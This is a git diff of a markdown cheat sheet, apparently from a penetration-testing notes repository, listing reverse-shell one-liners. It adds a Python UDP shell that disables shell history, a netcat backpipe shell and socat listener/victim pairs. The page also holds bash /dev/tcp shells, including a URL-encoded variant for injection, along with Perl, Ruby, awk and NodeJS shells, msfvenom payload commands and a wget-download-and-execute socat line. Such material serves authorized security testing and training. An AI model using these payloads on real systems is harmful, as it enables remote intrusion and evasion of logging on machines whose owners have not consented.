@@ -6,10 +6,10 @@ Hack Responsibly.
 Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
 {% endhint %}
 
-TODO: description, methodology, and script prep for each section \(issue [\#15](https://github.com/zweilosec/Infosec-Notes/issues/15)\)
+TODO: description, methodology, and script prep for each section (issue [#15](https://github.com/zweilosec/Infosec-Notes/issues/15))
 
 * Add description and methodology as needed for each section
-* Prep all code examples for scripting \(replace IPs and ports with variables, etc.\)
+* Prep all code examples for scripting (replace IPs and ports with variables, etc.)
 * Ensure code examples' variables are appropriate for their respective programming language
 
 ## Reverse Shells
@@ -60,6 +60,15 @@ export RHOST="192.168.1.2";export RPORT=4444;python -c 'import sys,socket,os,pty
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 
+#### Using Socat UDP Listener
+
+```python
+python -c 'import socket,pty,os;lhost = "10.10.15.80"; lport = 100; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv("HISTFILE",'/dev/null'); pty.spawn("/bin/bash"); s.close();
+
+#UDP Socat Listener
+socat file:`tty`,echo=0,raw  udp-listen:100
+```
+
 ### **PHP Reverse Shell**
 
 ```php
@@ -106,10 +115,23 @@ nc -e /bin/sh 192.168.1.2 80
 rm -f /tmp/p; mknod /tmp/p p && nc 192.168.1.2 4444 0/tmp/p
 ```
 
+```bash
+rm -f /var/tmp/backpipe 
+mknod /var/tmp/backpipe p
+nc $attack_ip $port 0</var/tmp/backpipe | /bin/bash 1>/var/tmp/backpipe
+```
+
 ### **Socat Reverse Shell**
 
-```text
-socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane
+```bash
+socat tcp-connect:$IP:$PORT exec:"bash -li",pty,stderr,setsid,sigint,sane
+```
+
+```bash
+#Listener
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+#Victim
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
 
 ### **Golang Reverse Shell**
@@ -130,13 +152,13 @@ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>"
 
 ### **Awk Reverse Shell**
 
-```text
+```
 awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
 
 ### **NodeJS Reverse Shell**
 
-```text
+```
 require('child_process').exec('nc -e /bin/sh 192.168.1.2 4444')
 ```
 
@@ -206,13 +228,13 @@ $ DISPLAY=attackerip:0 xterm
 
 * **Linux Non-Staged reverse TCP**
 
-```text
+```
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf >reversetcp.elf
 ```
 
 * **Linux Staged reverse TCP**
 
-```text
+```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf >reversetcp.elf
 ```
 
@@ -220,9 +242,9 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f el
 
 After catching a shell through netcat, you are placed in a shell that has very limited functionality. If the remote machine has python or python3 installed you can easily upgrade to a fully functional TTY shell.
 
- **Note:** To check if the shell is a TTY shell use the `tty` command.
+&#x20;**Note:** To check if the shell is a TTY shell use the `tty` command.
 
-### Upgrade to fully interactive shell \(python example\):
+### Upgrade to fully interactive shell (python example):
 
 ```bash
 #On victim machine
@@ -294,7 +316,7 @@ This one-liner can be injected wherever you can get command injection for an ins
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444
 ```
 
-### Using stty options
+### &#xD;Using stty options&#xD;
 
 ```bash
 # In reverse shell
@@ -312,7 +334,8 @@ export TERM=xterm-256color
 stty rows <num> columns <cols>
 ```
 
-## Misc unsorted
+Misc unsorted
+-------------
 
 ```bash
 bash -i >& /dev/tct/10.10.14.148/9001 0>&1
@@ -323,9 +346,9 @@ bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
 
 #### Bash
 
-Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) \(this was tested on Ubuntu 10.10\):
+Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) (this was tested on Ubuntu 10.10):
 
-* Works more reliably when prefixed with `bash -c` \(thanks Ippsec!\)
+* Works more reliably when prefixed with `bash -c` (thanks Ippsec!)
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
@@ -339,7 +362,7 @@ Here’s a shorter, feature-free version of the [perl-reverse-shell](http://pent
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-There’s also an [alternative PERL revere shell here](http://www.plenz.com/reverseshell). \(broken link?\)
+There’s also an [alternative PERL revere shell here](http://www.plenz.com/reverseshell). (broken link?)
 
 #### Python
 
@@ -369,7 +392,7 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i
 
 Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
 
-```text
+```
 nc -e /bin/sh 10.0.0.1 1234
 ```
 
@@ -389,21 +412,21 @@ p.waitFor()
 
 #### xterm
 
-One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you \(10.0.0.1\) on TCP port 6001.
+One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
 
-```text
+```
 xterm -display 10.0.0.1:1
 ```
 
-To catch the incoming xterm, start an X-Server \(:1 – which listens on TCP port 6001\). One way to do this is with Xnest \(to be run on your system\):
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):
 
-```text
+```
 Xnest :1
 ```
 
-You’ll need to authorize the target to connect to you \(command also run on your host\):
+You’ll need to authorize the target to connect to you (command also run on your host):
 
-```text
+```
 xhost +targetip
 ```
 
@@ -413,6 +436,6 @@ xhost +targetip
 * [http://pentestmonkey.net/blog/post-exploitation-without-a-tty](http://pentestmonkey.net/blog/post-exploitation-without-a-tty)
 * [https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html](https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html)
 * [https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
-* 
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
+*
 
+If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
